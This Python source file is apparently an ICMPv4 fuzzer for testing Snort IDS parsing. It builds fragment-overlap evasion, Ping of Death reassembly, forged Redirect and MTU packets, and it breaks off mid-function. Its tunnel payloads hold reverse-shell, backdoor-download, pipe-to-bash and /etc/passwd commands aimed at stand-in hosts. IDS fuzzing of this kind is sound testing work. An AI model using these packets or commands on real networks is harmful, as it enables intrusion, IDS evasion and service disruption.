"""
ICMPv4 protocol fuzzer — 14 deep mutation strategies targeting IDS/IPS ICMP
processing, IP fragment reassembly, embedded-header parsing, and stateful
tracking.

Target surface: Snort 3 codec/decoder (GID 124 — ICMP4 events, GID 116 — IP
decoder), frag3/defrag preprocessor (GID 123), and gid-1 text rules using
itype/icode/icmp_id/icmp_seq keywords.

RFC 792 (ICMP), RFC 1122 (Host Requirements), RFC 1191 (Path MTU Discovery),
RFC 6633 (Deprecation of Source Quench), RFC 1812 (Router Requirements).

Packet-type returns:
  - "icmp"      : raw ICMP bytes — caller wraps in IP + Ethernet
  - "fragments" : list of (payload, offset, mf, ip_id, proto) tuples for
                  StreamTransport.wrap_ip_fragments()
  - "raw_ip"    : pre-built IP packet (with IP header) — caller adds Ethernet
"""

import os
import random
import struct

# ── checksum / helpers ───────────────────────────────────────────────

def _icmp_checksum(data: bytes) -> int:
    """RFC 792 Internet checksum."""
    if len(data) % 2:
        data += b'\x00'
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return ~s & 0xFFFF


def _ip_checksum(hdr: bytes) -> int:
    s = sum(struct.unpack("!%dH" % (len(hdr) // 2), hdr))
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return ~s & 0xFFFF


def _build_icmp(type_val, code, rest_of_header, payload=b"", checksum=None):
    """Generic ICMP builder: type(1) + code(1) + checksum(2) + rest(4+) + payload."""
    hdr = struct.pack("!BB", type_val, code) + b'\x00\x00' + rest_of_header
    msg = hdr + payload
    if checksum is None:
        cs = _icmp_checksum(msg)
    else:
        cs = checksum & 0xFFFF
    return msg[:2] + struct.pack("!H", cs) + msg[4:]


def _echo(type_val=8, code=0, id_val=None, seq=None, payload=b"", checksum=None):
    """ICMP Echo Request (8) or Reply (0)."""
    if id_val is None:
        id_val = random.randint(0, 0xFFFF)
    if seq is None:
        seq = random.randint(0, 0xFFFF)
    rest = struct.pack("!HH", id_val, seq)
    return _build_icmp(type_val, code, rest, payload, checksum)


def _fake_ip_hdr(proto=6, src=0x0A000001, dst=0x0A000002, total_len=40,
                 ihl=5, version=4, flags_frag=0x4000, options=b""):
    """Build a fake inner IP header for embedding in ICMP error messages."""
    ver_ihl = ((version & 0xF) << 4) | (ihl & 0xF)
    hdr_len = ihl * 4
    hdr = bytearray(struct.pack("!BBHHHBBHII",
        ver_ihl, 0, total_len, random.randint(1, 0xFFFF), flags_frag,
        64, proto, 0, src, dst))
    cs = _ip_checksum(bytes(hdr))
    hdr[10:12] = struct.pack("!H", cs)
    result = bytes(hdr) + options
    # Pad or truncate to match ihl*4 if options supplied
    if len(result) < hdr_len:
        result += b'\x00' * (hdr_len - len(result))
    return result[:max(20, hdr_len)]


def _tcp8(sport=None, dport=None):
    """First 8 bytes of TCP header (src_port + dst_port + seq)."""
    if sport is None:
        sport = random.randint(1025, 65534)
    if dport is None:
        dport = random.choice([80, 443, 22, 25, 53, 445, 135])
    return struct.pack("!HHI", sport, dport, random.randint(1, 0xFFFFFFFF))


def _udp8(sport=None, dport=None):
    """First 8 bytes of UDP header."""
    if sport is None:
        sport = random.randint(1025, 65534)
    if dport is None:
        dport = random.choice([53, 161, 67, 547])
    return struct.pack("!HHHH", sport, dport, 100, 0)


def _error_msg(type_val, code, embedded, unused=0, checksum=None):
    """Build ICMP error (Type 3/4/5/11/12) with 4-byte unused/MTU + embedded data."""
    rest = struct.pack("!I", unused)
    return _build_icmp(type_val, code, rest, embedded, checksum)


def _raw_ip_packet(proto, src_ip, dst_ip, payload, ihl=5, ip_id=None,
                   flags_frag=0x4000, ttl=64, options=b""):
    """Build a complete raw IP packet."""
    if ip_id is None:
        ip_id = random.randint(1, 0xFFFF)
    hdr_len = max(ihl * 4, 20 + len(options))
    actual_ihl = hdr_len // 4
    ver_ihl = 0x40 | (actual_ihl & 0xF)
    total_len = hdr_len + len(payload)
    hdr = bytearray(struct.pack("!BBHHHBBHII",
        ver_ihl, 0, total_len, ip_id, flags_frag, ttl, proto, 0, src_ip, dst_ip))
    hdr[10:12] = struct.pack("!H", _ip_checksum(bytes(hdr)))
    return bytes(hdr) + options[:hdr_len - 20] + payload


_MAX_SEG = 58000  # stay under StreamTransport clamp

# ── strategy / weight / label definitions ────────────────────────────

ICMP_STRATEGIES = [
    "fragment_reassembly_evasion",
    "embedded_header_confusion",
    "type_code_matrix_attack",
    "checksum_desync",
    "redirect_route_injection",
    "tunnel_payload_evasion",
    "pmtud_blackhole",
    "unreachable_state_exhaustion",
    "ip_option_header_shift",
    "ping_of_death_reassembly",
    "rate_limit_bypass",
    "echo_id_seq_desync",
    "source_quench_deprecated",
    "timestamp_address_mask_probe",
]

ICMP_WEIGHTS = [
    14,   # fragment_reassembly_evasion   — classic IDS frag evasion
    12,   # embedded_header_confusion     — deep parser bugs in error msgs
    6,    # type_code_matrix_attack       — broad type/code coverage
    8,    # checksum_desync               — IDS/target disagreement
    6,    # redirect_route_injection      — ICMP Redirect abuse
    10,   # tunnel_payload_evasion        — covert channel / cross-proto
    10,   # pmtud_blackhole               — Path MTU Discovery abuse
    8,    # unreachable_state_exhaustion  — state-table exhaustion
    10,   # ip_option_header_shift        — IP options confuse ICMP offset
    12,   # ping_of_death_reassembly      — classic overflow via reassembly
    5,    # rate_limit_bypass             — circumvent rate limiting
    6,    # echo_id_seq_desync            — session tracking confusion
    4,    # source_quench_deprecated      — deprecated type handling
    5,    # timestamp_address_mask_probe  — info-leak / parsing abuse
]

ICMP_STRATEGY_LABELS = {
    "fragment_reassembly_evasion":    "Frag Reassembly Evasion",
    "embedded_header_confusion":      "Embedded Header Confusion",
    "type_code_matrix_attack":        "Type/Code Matrix Attack",
    "checksum_desync":                "Checksum Desync",
    "redirect_route_injection":       "Redirect Route Injection",
    "tunnel_payload_evasion":         "Tunnel Payload Evasion",
    "pmtud_blackhole":                "PMTUD Blackhole",
    "unreachable_state_exhaustion":   "Unreachable State Exhaustion",
    "ip_option_header_shift":         "IP Option Header Shift",
    "ping_of_death_reassembly":       "Ping of Death Reassembly",
    "rate_limit_bypass":              "Rate Limit Bypass",
    "echo_id_seq_desync":             "Echo ID/Seq Desync",
    "source_quench_deprecated":       "Source Quench Deprecated",
    "timestamp_address_mask_probe":   "Timestamp/AddrMask Probe",
}

# ── per-strategy payload builders ────────────────────────────────────

def _build_fragment_reassembly_evasion(payload_override=None):
    """IP fragmentation of ICMP to evade/crash defrag engine (GID 123).

    Variants target overlapping fragments (BSD-vs-Windows reassembly policy
    disagreement), tiny fragments that split the ICMP header across the
    fragment boundary so itype/icode rules can't match, out-of-order
    delivery, duplicate first fragments, fragment chains with gaps, and
    many-tiny-fragment memory exhaustion.
    """
    ip_id = random.randint(1, 0xFFFF)
    proto = 1  # ICMP
    echo_id = random.randint(0, 0xFFFF)
    echo_seq = random.randint(0, 0xFFFF)
    if payload_override is not None:
        icmp_pkt = _echo(8, 0, echo_id, echo_seq, payload_override)
        mid = (len(icmp_pkt) // 2 + 7) & ~7
        frag0 = icmp_pkt[:mid]
        frag1 = icmp_pkt[mid:]
        return [(frag0, 0, True, ip_id, proto),
                (frag1, mid, False, ip_id, proto)], "fragments"
    # Build a complete ICMP echo request with a recognisable payload
    trigger = b"FUZZ" + os.urandom(120)
    icmp_pkt = _echo(8, 0, echo_id, echo_seq, trigger)

    variant = random.choice([
        "overlapping_forward", "overlapping_backward", "tiny_header_split",
        "out_of_order", "duplicate_first", "gap_fragment", "many_tiny",
    ])

    if variant == "overlapping_forward":
        # Fragment 0 covers bytes 0-31, Fragment 1 covers bytes 16-end.
        # Overlap region 16-31 has DIFFERENT data in each fragment.
        frag0_data = icmp_pkt[:32]
        frag1_data = os.urandom(16) + icmp_pkt[32:]  # different overlap bytes
        return [(frag0_data, 0, True, ip_id, proto),
                (frag1_data, 16, False, ip_id, proto)], "fragments"

    elif variant == "overlapping_backward":
        # Send last fragment first (out-of-order + overlapping)
        frag1_data = icmp_pkt[24:]
        frag0_data = icmp_pkt[:32]  # overlaps bytes 24-31
        return [(frag1_data, 24, False, ip_id, proto),
                (frag0_data, 0, True, ip_id, proto)], "fragments"

    elif variant == "tiny_header_split":
        # Split ICMP header (8 bytes) across fragment boundary: first frag
        # has only 8 bytes (type+code+checksum+id — NOT the sequence number).
        # itype/icode rules may fail if they require the full 8-byte header
        # but the fragment only contains 8 bytes of ICMP.
        frag0 = icmp_pkt[:8]   # first 8 bytes of ICMP
        frag1 = icmp_pkt[8:]   # rest of ICMP
        return [(frag0, 0, True, ip_id, proto),
                (frag1, 8, False, ip_id, proto)], "fragments"

    elif variant == "out_of_order":
        # Three fragments delivered in reverse order
        chunk = max(8, (len(icmp_pkt) + 2) // 3)
        chunk = (chunk + 7) & ~7  # align to 8
        parts = []
        off = 0
        while off < len(icmp_pkt):
            end = min(off + chunk, len(icmp_pkt))
            mf = end < len(icmp_pkt)
            parts.append((icmp_pkt[off:end], off, mf, ip_id, proto))
            off = end
        parts.reverse()
        return parts, "fragments"

    elif variant == "duplicate_first":
        # Two different fragment-0 payloads with same IP ID
        alt_icmp = _echo(8, 0, echo_id, echo_seq, os.urandom(120))
        mid = 64
        mid = (mid + 7) & ~7
        return [(icmp_pkt[:mid], 0, True, ip_id, proto),
                (alt_icmp[:mid], 0, True, ip_id, proto),
                (icmp_pkt[mid:], mid, False, ip_id, proto)], "fragments"

    elif variant == "gap_fragment":
        # Fragment 0 and Fragment 2 present; Fragment 1 (bytes 32-63) missing
        frag0 = icmp_pkt[:32]
        frag2 = icmp_pkt[64:] if len(icmp_pkt) > 64 else os.urandom(32)
        return [(frag0, 0, True, ip_id, proto),
                (frag2, 64, False, ip_id, proto)], "fragments"

    else:  # many_tiny
        # 50+ fragments of 8 bytes each — memory/CPU exhaustion
        frags = []
        off = 0
        while off < len(icmp_pkt):
            end = min(off + 8, len(icmp_pkt))
            mf = end < len(icmp_pkt)
            frags.append((icmp_pkt[off:end], off, mf, ip_id, proto))
            off = end
        # Pad to at least 50 fragments
        while len(frags) < 50:
            frags.append((os.urandom(8), off, True, ip_id, proto))
            off += 8
        # Fix last fragment
        payload_last, off_last, _, id_last, p_last = frags[-1]
        frags[-1] = (payload_last, off_last, False, id_last, p_last)
        return frags, "fragments"


def _build_embedded_header_confusion():
    """Malformed embedded IP header + 8 transport bytes in ICMP error
    messages (GID 124:3-8).

    ICMP Type 3 (Dest Unreachable) / Type 11 (Time Exceeded) / Type 12
    (Parameter Problem) carry an embedded IP header + first 8 bytes of the
    original datagram.  Abuse: IHL lies, version mismatch, total_length lie,
    fragment flag in embedded, options that bleed into transport bytes,
    bad checksum, protocol confusion.
    """
    variant = random.choice([
        "ihl_too_large", "version_mismatch", "total_len_lie",
        "fragment_in_embedded", "options_overflow", "bad_embedded_checksum",
        "proto_confusion", "truncated_embedded",
    ])
    icmp_type = random.choice([3, 11, 12])
    code = random.randint(0, 3) if icmp_type == 3 else 0

    if variant == "ihl_too_large":
        # IHL=15 (60-byte header) but only 20 bytes supplied
        inner = _fake_ip_hdr(proto=6, ihl=15) + _tcp8()
        # Truncate to only 28 bytes (20 IP + 8 TCP) — parser reads past
        inner = inner[:28]

    elif variant == "version_mismatch":
        # IPv6 version (6) inside ICMPv4 error (124:5)
        inner = _fake_ip_hdr(proto=6, version=6) + _tcp8()

    elif variant == "total_len_lie":
        # total_length claims 4096 bytes but only 28 present (124:6)
        inner = _fake_ip_hdr(proto=6, total_len=4096) + _tcp8()

    elif variant == "fragment_in_embedded":
        # Embedded IP with MF=1 (original was a fragment — 124:7)
        inner = _fake_ip_hdr(proto=6, flags_frag=0x2000) + _tcp8()

    elif variant == "options_overflow":
        # IHL=8 → 32-byte header, but options extend into TCP 8 bytes area
        opts = os.urandom(12)  # 12 bytes of options
        inner = _fake_ip_hdr(proto=6, ihl=8, options=opts) + _tcp8()

    elif variant == "bad_embedded_checksum":
        # Deliberately corrupt the embedded IP checksum (124:8)
        inner = bytearray(_fake_ip_hdr(proto=6) + _tcp8())
        inner[10:12] = b'\xFF\xFF'
        inner = bytes(inner)

    elif variant == "proto_confusion":
        # Embedded IP claims proto=1 (ICMP) — ICMP-in-ICMP recursion
        inner = _fake_ip_hdr(proto=1) + _echo(8, 0)[:8]

    else:  # truncated_embedded
        # Only 12 bytes of embedded IP (less than minimum 20) (124:4)
        inner = _fake_ip_hdr(proto=6)[:12]

    return _error_msg(icmp_type, code, inner), "icmp"


def _build_type_code_matrix_attack():
    """Invalid / reserved / deprecated type+code combinations.

    Exercises parser code paths for unhandled types, out-of-range codes,
    deprecated Information Request/Reply (15/16) and Address Mask (17/18),
    and unsolicited Echo Replies.
    """
    variant = random.choice([
        "unassigned_type", "excessive_code", "deprecated_info_req",
        "deprecated_addr_mask", "unsolicited_reply", "type_max",
        "all_deprecated_types", "rapid_type_cycle",
    ])

    if variant == "unassigned_type":
        t = random.randint(44, 252)  # unassigned range
        return _build_icmp(t, 0, struct.pack("!I", 0), os.urandom(64)), "icmp"

    elif variant == "excessive_code":
        t = random.choice([3, 5, 11, 12])
        max_valid = {3: 15, 5: 3, 11: 1, 12: 2}
        c = random.randint(max_valid[t] + 1, 255)
        embedded = _fake_ip_hdr() + _tcp8()
        return _error_msg(t, c, embedded), "icmp"

    elif variant == "deprecated_info_req":
        # Type 15 Information Request (RFC 792, deprecated)
        return _build_icmp(15, 0, struct.pack("!HH", random.randint(0, 0xFFFF),
                           random.randint(0, 0xFFFF))), "icmp"

    elif variant == "deprecated_addr_mask":
        # Type 17/18 Address Mask Request/Reply (RFC 950, deprecated)
        t = random.choice([17, 18])
        rest = struct.pack("!HH", random.randint(0, 0xFFFF), random.randint(0, 0xFFFF))
        mask = struct.pack("!I", random.choice([0x00000000, 0xFFFFFFFF,
                                                 0xFFFFFF00, 0xFF000000]))
        return _build_icmp(t, 0, rest, mask), "icmp"

    elif variant == "unsolicited_reply":
        # Echo Reply (Type 0) without a matching request
        return _echo(0, 0, payload=os.urandom(56)), "icmp"

    elif variant == "type_max":
        return _build_icmp(255, 255, struct.pack("!I", 0), os.urandom(32)), "icmp"

    elif variant == "all_deprecated_types":
        # Random deprecated type: 4 (Source Quench), 6 (Alt Host Addr),
        # 15/16 (Info Req/Reply), 17/18 (Addr Mask), 30 (Traceroute)
        t = random.choice([4, 6, 15, 16, 17, 18, 30])
        return _build_icmp(t, 0, struct.pack("!I", 0), os.urandom(40)), "icmp"

    else:  # rapid_type_cycle
        # Build a packet with a random type 0-41 (assigned range)
        t = random.randint(0, 41)
        return _build_icmp(t, random.randint(0, 3), struct.pack("!I", 0),
                          os.urandom(48)), "icmp"


def _build_checksum_desync():
    """ICMP checksum manipulation for IDS/target disagreement.

    Variants: zero checksum, 0xFFFF (ones'-complement identity), checksum
    computed for a different type, off-by-one, checksum over truncated data,
    embedded-IP bad checksum with correct outer checksum.
    """
    variant = random.choice([
        "zero_checksum", "ffff_checksum", "type_swap", "off_by_one",
        "truncated_verify", "outer_ok_inner_bad",
    ])
    payload = os.urandom(56)

    if variant == "zero_checksum":
        return _echo(8, 0, payload=payload, checksum=0), "icmp"

    elif variant == "ffff_checksum":
        return _echo(8, 0, payload=payload, checksum=0xFFFF), "icmp"

    elif variant == "type_swap":
        # Compute checksum as type=8, then change type field to 0
        pkt = _echo(8, 0, payload=payload)
        pkt = bytes([0]) + pkt[1:]  # type 8 → 0, checksum now wrong for type 0
        return pkt, "icmp"

    elif variant == "off_by_one":
        pkt = _echo(8, 0, payload=payload)
        cs = struct.unpack("!H", pkt[2:4])[0]
        # ±1 from correct checksum
        bad_cs = (cs + random.choice([1, -1])) & 0xFFFF
        return pkt[:2] + struct.pack("!H", bad_cs) + pkt[4:], "icmp"

    elif variant == "truncated_verify":
        # Checksum correct only over first 16 bytes (not full packet)
        pkt = _echo(8, 0, payload=payload)
        partial = pkt[:16]
        if len(partial) % 2:
            partial += b'\x00'
        partial_cs = _icmp_checksum(partial[:2] + b'\x00\x00' + partial[4:])
        return pkt[:2] + struct.pack("!H", partial_cs) + pkt[4:], "icmp"

    else:  # outer_ok_inner_bad
        inner = bytearray(_fake_ip_hdr(proto=6) + _tcp8())
        inner[10:12] = b'\xDE\xAD'  # bad inner checksum
        return _error_msg(3, 1, bytes(inner)), "icmp"  # correct outer checksum


def _build_redirect_route_injection():
    """ICMP Redirect (Type 5) abuse for routing manipulation and IDS confusion.

    Gateway targets: loopback, multicast, broadcast, self-referential, and
    non-existent connections.
    """
    variant = random.choice([
        "loopback_gw", "multicast_gw", "broadcast_gw", "self_gw",
        "nonexistent_conn", "flood_gateways", "redirect_with_options",
    ])
    code = random.randint(0, 3)  # 0=net, 1=host, 2=TOS+net, 3=TOS+host

    if variant == "loopback_gw":
        gw = 0x7F000001  # 127.0.0.1
    elif variant == "multicast_gw":
        gw = 0xE0000001  # 224.0.0.1
    elif variant == "broadcast_gw":
        gw = 0xFFFFFFFF
    elif variant == "self_gw":
        gw = 0x0A000001  # same as embedded src
    elif variant == "flood_gateways":
        gw = random.randint(0x0A000001, 0x0AFFFFFF)
    elif variant == "redirect_with_options":
        gw = random.randint(0xC0A80001, 0xC0A800FE)
    else:  # nonexistent_conn
        gw = random.randint(0xC0A80001, 0xC0A800FE)

    inner = _fake_ip_hdr(proto=6, src=0x0A000001, dst=0x0A000002) + _tcp8()
    rest = struct.pack("!I", gw)
    return _build_icmp(5, code, rest, inner), "icmp"


def _build_tunnel_payload_evasion(payload_override=None):
    """Data hiding in ICMP Echo payloads (ptunnel-style).

    Embeds HTTP requests, DNS queries, shell commands, cross-protocol
    trigger strings, and nested ICMP packets inside Echo Request payloads
    to test deep-inspection depth and cross-protocol rule confusion.
    """
    if payload_override is not None:
        return _echo(8, 0, payload=payload_override), "icmp"
    variant = random.choice([
        "http_tunnel", "dns_tunnel", "shell_tunnel",
        "cross_proto_trigger", "depth_probe", "nested_icmp",
        "encrypted_xor",
    ])

    if variant == "http_tunnel":
        payload = (b"GET /secret HTTP/1.1\r\nHost: evil.example.com\r\n"
                   b"Cookie: session=STOLEN\r\n\r\n")

    elif variant == "dns_tunnel":
        # Fake DNS query for evil.example.com
        payload = (b'\x13\x37\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
                   b'\x04evil\x07example\x03com\x00\x00\x01\x00\x01')

    elif variant == "shell_tunnel":
        cmds = [b"/bin/sh -i", b"cat /etc/passwd", b"nc -e /bin/sh 10.0.0.1 4444",
                b"wget http://evil.com/backdoor -O /tmp/bd && chmod +x /tmp/bd",
                b"curl http://c2.example.com/beacon | bash"]
        payload = random.choice(cmds) + b'\x00' + os.urandom(32)

    elif variant == "cross_proto_trigger":
        # Content that could trigger Snort rules meant for other protocols
        triggers = [b"USER anonymous\r\n", b"EHLO evil.com\r\n",
                    b"\xfe\xed\xfa\xce" + b"SMBr\x00",
                    b"SSH-2.0-OpenSSH_evil\r\n",
                    b"\x05\x01\x00\x03"]  # SOCKS5-like
        payload = random.choice(triggers) + os.urandom(64)

    elif variant == "depth_probe":
        # Incrementally large payloads to find inspection depth cutoff
        size = random.choice([100, 500, 1000, 4000, 8000, 16000, 32000])
        payload = os.urandom(size)

    elif variant == "nested_icmp":
        # ICMP Echo containing another complete ICMP Echo (ICMP-in-ICMP)
        inner = _echo(8, 0, payload=os.urandom(32))
        payload = inner

    else:  # encrypted_xor
        # XOR-encrypted payload that hides content from pattern matching
        cleartext = b"GET /admin HTTP/1.1\r\nHost: victim\r\n\r\n"
        key = random.randint(1, 255)
        payload = bytes(b ^ key for b in cleartext) + struct.pack("B", key)

    return _echo(8, 0, payload=payload), "icmp"


def _build_pmtud_blackhole():
    """Path MTU Discovery abuse (RFC 1191) via ICMP Type 3 Code 4
    (Fragmentation Needed and DF Set).

    Manipulates the next-hop MTU field to cause division-by-zero, extreme
    fragmentation (MTU=68/1), contradictory values, and rapid oscillation.
    """
    variant = random.choice([
        "zero_mtu", "minimum_mtu", "one_byte_mtu", "max_mtu",
        "oscillating_mtu", "forged_tcp_conn", "contradictory_mtu",
    ])

    inner_tcp = _tcp8(sport=random.randint(1025, 65534), dport=80)
    inner = _fake_ip_hdr(proto=6, total_len=1500) + inner_tcp

    if variant == "zero_mtu":
        mtu = 0  # division-by-zero risk
    elif variant == "minimum_mtu":
        mtu = 68  # IPv4 minimum — legal but extreme
    elif variant == "one_byte_mtu":
        mtu = 1  # absurd — forces 1-byte segments
    elif variant == "max_mtu":
        mtu = 0xFFFF
    elif variant == "oscillating_mtu":
        mtu = random.choice([68, 1500, 68, 576, 68, 9000])
    elif variant == "forged_tcp_conn":
        # Embedded header matching a plausible active connection
        inner = _fake_ip_hdr(proto=6, src=0xC0A80164, dst=0xC0A80101,
                             total_len=1500) + _tcp8(sport=443, dport=54321)
        mtu = 68
    else:  # contradictory_mtu
        # MTU > total_length in embedded header (contradictory)
        inner = _fake_ip_hdr(proto=6, total_len=100) + inner_tcp
        mtu = 9000

    # Type 3, Code 4: unused field = 0x0000 || next-hop MTU (16-bit)
    unused_mtu = mtu & 0xFFFF  # lower 16 bits are next-hop MTU
    return _error_msg(3, 4, inner, unused=unused_mtu), "icmp"


def _build_unreachable_state_exhaustion():
    """ICMP Destination Unreachable flood targeting IDS connection tracking.

    Each message carries a unique embedded src:port→dst:port tuple, creating
    or modifying state-table entries.  Exercises all 16 codes, protocol
    unreachable for many protocols, port unreachable for many ports.
    """
    variant = random.choice([
        "unique_tuples", "all_codes", "protocol_unreachable",
        "port_scan_flood", "nonexistent_connections", "conflicting_state",
    ])

    if variant == "unique_tuples":
        src = random.randint(0x0A000001, 0x0AFFFFFF)
        dst = random.randint(0xC0A80001, 0xC0A8FFFE)
        inner = _fake_ip_hdr(proto=6, src=src, dst=dst) + _tcp8()
        code = random.randint(0, 15)

    elif variant == "all_codes":
        code = random.randint(0, 15)
        inner = _fake_ip_hdr(proto=6) + _tcp8()

    elif variant == "protocol_unreachable":
        # Code 2 — Protocol Unreachable for various protocol numbers
        proto_num = random.choice([1, 6, 17, 47, 50, 51, 89, 132])
        inner = _fake_ip_hdr(proto=proto_num) + os.urandom(8)
        code = 2

    elif variant == "port_scan_flood":
        # Code 3 — Port Unreachable for sequential ports
        port = random.randint(1, 65535)
        inner = _fake_ip_hdr(proto=17) + _udp8(dport=port)
        code = 3

    elif variant == "nonexistent_connections":
        # Fabricated embedded headers for connections that never existed
        inner = _fake_ip_hdr(proto=6, src=random.randint(1, 0xFEFFFFFF),
                             dst=random.randint(1, 0xFEFFFFFF)) + _tcp8()
        code = random.choice([0, 1, 3, 9, 10, 13])

    else:  # conflicting_state
        # Dest Unreachable followed immediately by data for same "connection"
        src = 0x0A000001
        dst = 0x0A000002
        inner = _fake_ip_hdr(proto=6, src=src, dst=dst) + _tcp8(sport=12345, dport=80)
        code = 1  # Host Unreachable

    return _error_msg(3, code, inner), "icmp"


def _build_ip_option_header_shift():
    """IP options that shift the ICMP payload offset within the IP packet.

    Normal ICMP starts at byte 20 (IHL=5).  Adding IP options pushes ICMP
    to byte 24, 28, ..., up to 60 (IHL=15).  If the IDS parses ICMP at a
    fixed offset, it reads option bytes as ICMP type/code — evasion.
    Also tests IHL=0/1 (invalid), IHL mismatch, and multiple options.
    """
    variant = random.choice([
        "record_route", "timestamp_option", "loose_source_route",
        "max_options", "ihl_zero", "ihl_mismatch", "multi_options",
    ])

    icmp_payload = _echo(8, 0, payload=os.urandom(56))
    src_ip = random.randint(0x01000001, 0xFEFFFFFF)
    dst_ip = 0x7F000001

    if variant == "record_route":
        # IP Record Route option: type=7, length=11, pointer=4, + 2×IP
        opt = bytes([7, 11, 4]) + struct.pack("!II", 0, 0)
        opt += b'\x00'  # NOP pad to 4-byte boundary → 12 bytes
        return _raw_ip_packet(1, src_ip, dst_ip, icmp_payload,
                              ihl=8, options=opt), "raw_ip"

    elif variant == "timestamp_option":
        # IP Timestamp option: type=68, length=12, pointer=5, overflow/flag=0
        opt = bytes([68, 12, 5, 0]) + struct.pack("!II", 0, 0)
        return _raw_ip_packet(1, src_ip, dst_ip, icmp_payload,
                              ihl=8, options=opt), "raw_ip"

    elif variant == "loose_source_route":
        # Loose Source Route: type=131, length=11, pointer=4, + 2 hops
        opt = bytes([131, 11, 4]) + struct.pack("!II", src_ip, dst_ip)
        opt += b'\x00'
        return _raw_ip_packet(1, src_ip, dst_ip, icmp_payload,
                              ihl=8, options=opt), "raw_ip"

    elif variant == "max_options":
        # IHL=15 → 60-byte header → 40 bytes of options (NOP padded)
        opt = bytes([1]) * 40  # all NOPs
        return _raw_ip_packet(1, src_ip, dst_ip, icmp_payload,
                              ihl=15, options=opt), "raw_ip"

    elif variant == "ihl_zero":
        # IHL=0 (invalid) — raw IP with corrupted IHL
        pkt = bytearray(_raw_ip_packet(1, src_ip, dst_ip, icmp_payload, ihl=5))
        pkt[0] = 0x40  # version=4, IHL=0
        return bytes(pkt), "raw_ip"

    elif variant == "ihl_mismatch":
        # IHL=8 but no options present — reads past IP header into ICMP
        pkt = _raw_ip_packet(1, src_ip, dst_ip, icmp_payload, ihl=5)
        pkt = bytearray(pkt)
        pkt[0] = 0x48  # IHL=8
        # Recalculate total length
        new_total = 32 + len(icmp_payload)  # 32 = ihl=8 * 4
        pkt[2:4] = struct.pack("!H", new_total)
        # Re-checksum IP header
        pkt[10:12] = b'\x00\x00'
        pkt[10:12] = struct.pack("!H", _ip_checksum(bytes(pkt[:20])))
        return bytes(pkt), "raw_ip"

    else:  # multi_options
        # Record Route + Timestamp + NOPs
        rr = bytes([7, 7, 4]) + struct.pack("!I", 0)     # 7 bytes
        ts = bytes([68, 8, 5, 0]) + struct.pack("!I", 0)  # 8 bytes
        opt = rr + ts + bytes([1]) * 5  # pad to 20 bytes → IHL=10
        return _raw_ip_packet(1, src_ip, dst_ip, icmp_payload,
                              ihl=10, options=opt), "raw_ip"


def _build_ping_of_death_reassembly():
    """Oversized reassembly attacks (CVE-1999-0128 Ping of Death).

    IP fragments that reassemble to >65535 bytes, exactly 65535, or use
    extreme offsets.  Tests reassembly buffer overflow and integer arithmetic.
    """
    ip_id = random.randint(1, 0xFFFF)
    proto = 1
    variant = random.choice([
        "exact_65535", "overflow_65536", "huge_offset",
        "many_tiny_frags", "offset_wrap",
    ])

    if variant == "exact_65535":
        # 20 (IP) + 65515 (payload) = 65535; split into fragments
        icmp = _echo(8, 0, payload=os.urandom(120))
        off2 = 65504  # 8191 * 8 = 65528; use 65504 + 11 bytes
        frag0 = (icmp, 0, True, ip_id, proto)
        frag1 = (os.urandom(11), off2, False, ip_id, proto)
        return [frag0, frag1], "fragments"

    elif variant == "overflow_65536":
        # Last fragment at offset 65528 (8191*8) with 9 bytes → total 65537
        icmp = _echo(8, 0, payload=os.urandom(64))
        frag0 = (icmp, 0, True, ip_id, proto)
        frag1 = (os.urandom(9), 65528, False, ip_id, proto)
        return [frag0, frag1], "fragments"

    elif variant == "huge_offset":
        # Fragment with maximum legal offset 8191 (×8 = 65528)
        icmp = _echo(8, 0, payload=os.urandom(32))
        frag0 = (icmp, 0, True, ip_id, proto)
        frag1 = (os.urandom(8), 65528, False, ip_id, proto)
        return [frag0, frag1], "fragments"

    elif variant == "many_tiny_frags":
        # 200+ 8-byte fragments → memory/CPU exhaustion
        icmp = _echo(8, 0, payload=os.urandom(56))
        frags = []
        off = 0
        for i in range(200):
            chunk = icmp[off:off+8] if off < len(icmp) else os.urandom(8)
            mf = (i < 199)
            frags.append((chunk, off, mf, ip_id, proto))
            off += 8
        return frags, "fragments"

    else:  # offset_wrap
        # Offset near 0xFFFF in 8-byte units would wrap 16-bit arithmetic
        # Offset 8190 × 8 = 65520 + 32 bytes payload = 65552 > 65535
        icmp = _echo(8, 0, payload=os.urandom(32))
        frag0 = (icmp, 0, True, ip_id, proto)
        frag1 = (os.urandom(32), 65520, False, ip_id, proto)
        return [frag0, frag1], "fragments"


def _build_rate_limit_bypass():
    """Circumventing IDS ICMP rate limiting and flood detection.

    Strategies: randomised source characteristics, type diversity to bypass
    per-type counters, fragmented echo (N fragments = N "packets" in rate
    counter), TTL=1 causing Time Exceeded generation, and land attack
    (src=dst).
    """
    variant = random.choice([
        "random_source", "type_diversity", "fragment_count",
        "ttl_one", "land_attack", "self_reply",
    ])

    if variant == "random_source":
        return _echo(8, 0, id_val=random.randint(0, 0xFFFF),
                     seq=random.randint(0, 0xFFFF),
                     payload=os.urandom(56)), "icmp"

    elif variant == "type_diversity":
        # Rotate between Echo(8), Timestamp(13), Info Request(15)
        t = random.choice([8, 13, 15])
        if t == 8:
            return _echo(8, 0, payload=os.urandom(56)), "icmp"
        elif t == 13:
            # Timestamp: id(2) + seq(2) + originate(4) + receive(4) + transmit(4)
            rest = struct.pack("!HH", random.randint(0, 0xFFFF),
                              random.randint(0, 0xFFFF))
            ts_data = struct.pack("!III", 0, 0, 0)
            return _build_icmp(13, 0, rest, ts_data), "icmp"
        else:
            rest = struct.pack("!HH", random.randint(0, 0xFFFF),
                              random.randint(0, 0xFFFF))
            return _build_icmp(15, 0, rest), "icmp"

    elif variant == "fragment_count":
        # Single echo fragmented into 5 pieces — rate counter sees 5 packets
        ip_id = random.randint(1, 0xFFFF)
        icmp = _echo(8, 0, payload=os.urandom(120))
        frags = []
        off = 0
        chunk_size = 32
        while off < len(icmp):
            end = min(off + chunk_size, len(icmp))
            mf = end < len(icmp)
            frags.append((icmp[off:end], off, mf, ip_id, 1))
            off = end
        return frags, "fragments"

    elif variant == "ttl_one":
        # TTL=1 → first router generates Time Exceeded back to us
        src_ip = random.randint(0x01000001, 0xFEFFFFFF)
        icmp = _echo(8, 0, payload=os.urandom(56))
        return _raw_ip_packet(1, src_ip, 0x7F000001, icmp, ttl=1), "raw_ip"

    elif variant == "land_attack":
